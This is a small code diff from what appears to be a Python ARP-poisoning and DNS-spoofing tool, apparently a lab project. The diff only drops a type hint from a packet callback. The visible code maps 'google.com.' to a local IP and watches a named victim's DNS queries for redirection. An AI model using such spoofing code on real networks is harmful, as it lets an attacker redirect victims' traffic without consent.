@@ -364,7 +364,7 @@ class ARPP(object):
         target_sites = {"google.com.":"192.168.178.217",\
             "test.nl":"192.168.178.217"}
         
-        def packet_callback(packet:scapy):
+        def packet_callback(packet):
             if DNS in packet and DNSQR in packet and IP in packet and packet[IP].src == ipVictim:
                 print(f"DNS in packet: {DNS in packet}") 
                 print(f"DNS request for targeted site: {any([target_site in str(packet[DNSQR].qname) for target_site in target_sites.keys()])}" ) 
